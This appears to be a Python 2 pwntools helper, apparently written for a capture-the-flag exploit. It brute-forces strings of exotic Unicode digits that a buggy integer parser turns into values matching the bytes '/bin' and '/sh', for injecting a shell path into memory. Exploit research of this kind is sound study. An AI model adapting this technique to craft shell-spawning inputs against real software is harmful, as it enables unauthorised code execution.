import pwn
from random import choice
digits = [
u'\u0660', 
u'\u0661', 
u'\u0662', 
u'\u0663', 
u'\u0664', 
u'\u0665', 
u'\u0666', 
u'\u0667', 
u'\u0668', 
u'\u0669', 
u'\u06F0', 
u'\u06F1', 
u'\u06F2', 
u'\u06F3', 
u'\u06F4', 
u'\u06F5', 
u'\u06F6', 
u'\u06F7', 
u'\u06F8', 
u'\u06F9', 
u'\u07C0', 
u'\u07C1', 
u'\u07C2', 
u'\u07C3', 
u'\u07C4', 
u'\u07C5', 
u'\u07C6', 
u'\u07C7', 
u'\u07C8', 
u'\u07C9', 
u'\u0966', 
u'\u0967', 
u'\u0968', 
u'\u0969', 
u'\u096A', 
u'\u096B', 
u'\u096C', 
u'\u096D', 
u'\u096E', 
u'\u096F', 
u'\u09E6', 
u'\u09E7', 
u'\u09E8', 
u'\u09E9', 
u'\u09EA', 
u'\u09EB', 
u'\u09EC', 
u'\u09ED', 
u'\u09EE', 
u'\u09EF', 
u'\u0A66', 
u'\u0A67', 
u'\u0A68', 
u'\u0A69', 
u'\u0A6A', 
u'\u0A6B', 
u'\u0A6C', 
u'\u0A6D', 
u'\u0A6E', 
u'\u0A6F', 
u'\u0AE6', 
u'\u0AE7', 
u'\u0AE8', 
u'\u0AE9', 
u'\u0AEA', 
u'\u0AEB', 
u'\u0AEC', 
u'\u0AED', 
u'\u0AEE', 
u'\u0AEF', 
u'\u0B66', 
u'\u0B67', 
u'\u0B68', 
u'\u0B69', 
u'\u0B6A', 
u'\u0B6B', 
u'\u0B6C', 
u'\u0B6D', 
u'\u0B6E', 
u'\u0B6F', 
u'\u0BE6', 
u'\u0BE7', 
u'\u0BE8', 
u'\u0BE9', 
u'\u0BEA', 
u'\u0BEB', 
u'\u0BEC', 
u'\u0BED', 
u'\u0BEE', 
u'\u0BEF', 
u'\u0C66', 
u'\u0C67', 
u'\u0C68', 
u'\u0C69', 
u'\u0C6A', 
u'\u0C6B', 
u'\u0C6C', 
u'\u0C6D', 
u'\u0C6E', 
u'\u0C6F', 
u'\u0CE6', 
u'\u0CE7', 
u'\u0CE8', 
u'\u0CE9', 
u'\u0CEA', 
u'\u0CEB', 
u'\u0CEC', 
u'\u0CED', 
u'\u0CEE', 
u'\u0CEF', 
u'\u0D66', 
u'\u0D67', 
u'\u0D68', 
u'\u0D69', 
u'\u0D6A', 
u'\u0D6B', 
u'\u0D6C', 
u'\u0D6D', 
u'\u0D6E', 
u'\u0D6F', 
u'\u0DE6', 
u'\u0DE7', 
u'\u0DE8', 
u'\u0DE9', 
u'\u0DEA', 
u'\u0DEB', 
u'\u0DEC', 
u'\u0DED', 
u'\u0DEE', 
u'\u0DEF', 
u'\u0E50', 
u'\u0E51', 
u'\u0E52', 
u'\u0E53', 
u'\u0E54', 
u'\u0E55', 
u'\u0E56', 
u'\u0E57', 
u'\u0E58', 
u'\u0E59', 
u'\u0ED0', 
u'\u0ED1', 
u'\u0ED2', 
u'\u0ED3', 
u'\u0ED4', 
u'\u0ED5', 
u'\u0ED6', 
u'\u0ED7', 
u'\u0ED8', 
u'\u0ED9', 
u'\u0F20', 
u'\u0F21', 
u'\u0F22', 
u'\u0F23', 
u'\u0F24', 
u'\u0F25', 
u'\u0F26', 
u'\u0F27', 
u'\u0F28', 
u'\u0F29', 
u'\u1040', 
u'\u1041', 
u'\u1042', 
u'\u1043', 
u'\u1044', 
u'\u1045', 
u'\u1046', 
u'\u1047', 
u'\u1048', 
u'\u1049', 
u'\u1090', 
u'\u1091', 
u'\u1092', 
u'\u1093', 
u'\u1094', 
u'\u1095', 
u'\u1096', 
u'\u1097', 
u'\u1098', 
u'\u1099', 
u'\u17E0', 
u'\u17E1', 
u'\u17E2', 
u'\u17E3', 
u'\u17E4', 
u'\u17E5', 
u'\u17E6', 
u'\u17E7', 
u'\u17E8', 
u'\u17E9', 
u'\u1810', 
u'\u1811', 
u'\u1812', 
u'\u1813', 
u'\u1814', 
u'\u1815', 
u'\u1816', 
u'\u1817', 
u'\u1818', 
u'\u1819', 
u'\u1946', 
u'\u1947', 
u'\u1948', 
u'\u1949', 
u'\u194A', 
u'\u194B', 
u'\u194C', 
u'\u194D', 
u'\u194E', 
u'\u194F', 
u'\u19D0', 
u'\u19D1', 
u'\u19D2', 
u'\u19D3', 
u'\u19D4', 
u'\u19D5', 
u'\u19D6', 
u'\u19D7', 
u'\u19D8', 
u'\u19D9', 
u'\u1A80', 
u'\u1A81', 
u'\u1A82', 
u'\u1A83', 
u'\u1A84', 
u'\u1A85', 
u'\u1A86', 
u'\u1A87', 
u'\u1A88', 
u'\u1A89', 
u'\u1A90', 
u'\u1A91', 
u'\u1A92', 
u'\u1A93', 
u'\u1A94', 
u'\u1A95', 
u'\u1A96', 
u'\u1A97', 
u'\u1A98', 
u'\u1A99', 
u'\u1B50', 
u'\u1B51', 
u'\u1B52', 
u'\u1B53', 
u'\u1B54', 
u'\u1B55', 
u'\u1B56', 
u'\u1B57', 
u'\u1B58', 
u'\u1B59', 
u'\u1BB0', 
u'\u1BB1', 
u'\u1BB2', 
u'\u1BB3', 
u'\u1BB4', 
u'\u1BB5', 
u'\u1BB6', 
u'\u1BB7', 
u'\u1BB8', 
u'\u1BB9', 
u'\u1C40', 
u'\u1C41', 
u'\u1C42', 
u'\u1C43', 
u'\u1C44', 
u'\u1C45', 
u'\u1C46', 
u'\u1C47', 
u'\u1C48', 
u'\u1C49', 
u'\u1C50', 
u'\u1C51', 
u'\u1C52', 
u'\u1C53', 
u'\u1C54', 
u'\u1C55', 
u'\u1C56', 
u'\u1C57', 
u'\u1C58', 
u'\u1C59', 
u'\uA620', 
u'\uA621', 
u'\uA622', 
u'\uA623', 
u'\uA624', 
u'\uA625', 
u'\uA626', 
u'\uA627', 
u'\uA628', 
u'\uA629', 
u'\uA8D0', 
u'\uA8D1', 
u'\uA8D2', 
u'\uA8D3', 
u'\uA8D4', 
u'\uA8D5', 
u'\uA8D6', 
u'\uA8D7', 
u'\uA8D8', 
u'\uA8D9', 
u'\uA900', 
u'\uA901', 
u'\uA902', 
u'\uA903', 
u'\uA904', 
u'\uA905', 
u'\uA906', 
u'\uA907', 
u'\uA908', 
u'\uA909', 
u'\uA9D0', 
u'\uA9D1', 
u'\uA9D2', 
u'\uA9D3', 
u'\uA9D4', 
u'\uA9D5', 
u'\uA9D6', 
u'\uA9D7', 
u'\uA9D8', 
u'\uA9D9', 
u'\uA9F0', 
u'\uA9F1', 
u'\uA9F2', 
u'\uA9F3', 
u'\uA9F4', 
u'\uA9F5', 
u'\uA9F6', 
u'\uA9F7', 
u'\uA9F8', 
u'\uA9F9', 
u'\uAA50', 
u'\uAA51', 
u'\uAA52', 
u'\uAA53', 
u'\uAA54', 
u'\uAA55', 
u'\uAA56', 
u'\uAA57', 
u'\uAA58', 
u'\uAA59', 
u'\uABF0', 
u'\uABF1', 
u'\uABF2', 
u'\uABF3', 
u'\uABF4', 
u'\uABF5', 
u'\uABF6', 
u'\uABF7', 
u'\uABF8', 
u'\uABF9', 
u'\uFF10', 
u'\uFF11', 
u'\uFF12', 
u'\uFF13', 
u'\uFF14', 
u'\uFF15', 
u'\uFF16', 
u'\uFF17', 
u'\uFF18', 
u'\uFF19', 
] 

zeros = [digits[i] for i in range(0, len(digits), 10)]
def b2s (_c):
  c = ord(_c)
  res = c 
  if c > 0x7f:
    res = -0x100 + c 
  return res 


def d2s (i):
  res = i & 0xffffffff
  if res > 0x7fffffff:
    res = (-0x100000000 + res) 
  return res 

def intbracket (s):
  res = 0 
  for c in s:
    res = d2s(res * 10 + b2s(c) - 0x30)
  return res 

def get_random_zero (i):
  return ''.join([choice(zeros).encode('utf-8') for _ in xrange(i)])

target1 = pwn.u32("/bin") & 0xffff0000
target2 = pwn.u32("/sh\x00") & 0xffff0000

for aux in xrange(len(digits) / 10):
  for i in zeros:
    for j in xrange (100000):
      for k in range (10):
        #raw = (intbracket(i.encode('utf-8') + "0"*k + str(j))) & 0xffffffff
        raw = (intbracket(i.encode('utf-8') + "0"*k + str(j/10) + digits[j%10 + 10*aux].encode('utf-8'))) & 0xffffffff
        if (raw & 0xffff0000) == target1:
          #print i.encode('utf-8') + "0"*k + str(j)
          print i.encode('utf-8') + "0"*k + str(j/10) + digits[j%10 + 10*aux].encode('utf-8')
          print hex(raw)
        if (raw & 0xffff0000) == target2:
          #print i.encode('utf-8') + "0"*k + str(j)
          print i.encode('utf-8') + "0"*k + str(j/10) + digits[j%10 + 10*aux].encode('utf-8')
          print hex(raw)
